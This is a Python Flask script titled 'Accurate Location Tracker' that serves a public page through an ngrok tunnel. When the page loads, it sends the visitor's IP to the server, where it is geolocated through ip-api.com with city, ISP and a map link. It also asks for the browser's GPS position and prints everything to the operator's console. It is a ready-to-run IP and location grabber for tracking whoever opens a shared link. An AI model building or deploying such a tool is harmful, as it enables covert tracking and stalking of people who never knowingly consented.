from flask import Flask, request, render_template_string
import requests
import datetime
import os
import time
import subprocess
from threading import Thread

app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
  <title>Accurate Location Tracker</title>
</head>
<body>
  <h2>Thanks for visiting!</h2>
  <p>Your IP has been logged.</p>
  <script>
    // Immediately send visitor IP info to server
    fetch("/log_ip", {method: "POST"})
      .catch(() => {});

    // Try to get GPS location as well, if user allows
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        function(position) {
          fetch("/submit_location", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy
            })
          }).catch(() => {});
        }
      );
    }
  </script>
</body>
</html>
"""

def get_ip_location(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = res.json()
        if data["status"] == "success":
            return {
                "method": "IP-based",
                "IP": ip,
                "City": data.get("city"),
                "Region": data.get("regionName"),
                "Country": data.get("country"),
                "Latitude": data.get("lat"),
                "Longitude": data.get("lon"),
                "ISP": data.get("isp"),
                "Map": f"https://maps.google.com/?q={data.get('lat')},{data.get('lon')}",
                "Time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
    except Exception as e:
        return {"method": "IP-based", "Error": str(e)}
    return {"method": "IP-based", "Error": "Unknown error"}

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/log_ip', methods=["POST"])
def log_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    data = get_ip_location(ip)

    print("\n--- Immediate IP Captured ---")
    for k, v in data.items():
        print(f"{k}: {v}")
    print("----------------------------\n")

    return "IP logged"

@app.route('/submit_location', methods=["POST"])
def submit_location():
    data = request.get_json()
    lat = data.get("latitude")
    lon = data.get("longitude")
    accuracy = data.get("accuracy")

    result = {
        "method": "GPS",
        "Latitude": lat,
        "Longitude": lon,
        "Accuracy (m)": accuracy,
        "Map": f"https://maps.google.com/?q={lat},{lon}",
        "Time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

    print("\n--- Accurate Location Captured (GPS) ---")
    for k, v in result.items():
        print(f"{k}: {v}")
    print("----------------------------------------\n")

    return "Location received!"

def download_ngrok():
    if os.name == 'posix' and not os.path.isfile("ngrok"):
        print("[•] Downloading ngrok...")
        os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip -O ngrok.zip")
        os.system("unzip ngrok.zip && rm ngrok.zip")
        os.system("chmod +x ngrok")
    elif os.name == 'nt':
        print("[•] Please manually download ngrok for Windows from https://ngrok.com/download")

def start_ngrok():
    token = input("Enter your Ngrok Authtoken: ").strip()
    subdomain = input("Enter desired subdomain (leave blank for random): ").strip()

    if not os.path.isfile("ngrok"):
        download_ngrok()

    os.system(f"./ngrok authtoken {token}")

    cmd = ["./ngrok", "http", "5000"]
    if subdomain:
        cmd.append(f"--subdomain={subdomain}")

    print("\n[•] Starting ngrok tunnel...")
    ngrok_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)

    time.sleep(5)  # Wait for ngrok to initialize

    try:
        tunnels = requests.get("http://localhost:4040/api/tunnels").json()
        public_url = tunnels['tunnels'][0]['public_url']
        print(f"\n[✓] Ngrok tunnel started: {public_url}")
    except Exception as e:
        print(f"\n[✗] Failed to get ngrok public URL: {e}")

    return ngrok_process

def run_flask():
    app.run(host="0.0.0.0", port=5000)

if __name__ == '__main__':
    print("\033[92m[✓] Starting Accurate Location Tracker with Ngrok integration\033[0m")
    ngrok_process = start_ngrok()

    flask_thread = Thread(target=run_flask)
    flask_thread.start()

    try:
        while flask_thread.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
        ngrok_process.terminate()
        flask_thread.join()
